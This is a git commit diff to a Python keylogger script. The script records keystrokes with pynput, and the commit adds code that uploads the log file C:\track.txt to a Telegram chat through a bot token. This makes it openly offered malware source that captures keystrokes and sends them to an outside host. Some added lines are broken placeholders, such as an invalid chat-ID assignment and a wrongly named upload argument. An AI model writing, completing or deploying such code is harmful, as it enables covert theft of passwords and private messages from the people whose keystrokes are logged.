59c1f97bd573c9c1b6928d24edf0d82f211b1a69
MAN B <80488842+ManB-crypto@users.noreply.github.com>
2022-06-03 21:55:23 +0800

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,7 @@
 from pynput.keyboard import *
 import logging
+import telepot
+from datetime import date
 
 log_dir = ""
 
@@ -10,3 +12,14 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+    
+    
+
+bot_token = 'BOT_TOKEN'
+tel_id = ID_personal or group
+today = date.today()
+bot = telepot.Bot(bot_token)
+bot.sendDocument(tel_id,photo=open(r'C:\\track.txt', 'rb'),caption=today)
+#bot.sendMessage(tel_id,'testing meesagsse')
+
+
